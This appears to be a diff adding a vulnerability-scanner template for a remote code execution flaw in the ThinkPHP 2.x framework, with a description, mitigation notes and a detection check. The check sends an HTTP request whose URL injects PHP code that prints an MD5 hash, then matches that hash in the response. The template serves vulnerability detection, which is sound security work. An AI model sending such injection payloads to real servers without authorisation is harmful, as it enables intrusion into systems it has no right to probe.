@@ -1,0 +1,33 @@
+id: thinkphp2_rce
+
+info:
+  name: "ThinkPHP 2.x 框架任意方法调用远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Targeted vulnerability in ThinkPHP 2.x framework enabling remote code execution through unrestricted method invocation
+      
+      
+      Technical impact:
+        - Attackers can execute arbitrary code on the target server by exploiting method invocation handling flaws
+        - Vulnerability stems from improper validation of method parameters in request processing
+      
+      Affected components:
+        - Core request routing mechanism in ThinkPHP 2.x versions
+      
+      Mitigation:
+        - Upgrade to officially patched framework versions
+        - Implement strict input validation for method invocation parameters
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=a/b/c/$%7Bvar_dump(md5(1))%7D HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'c4ca4238a0b923820dcc509a6f75849b'
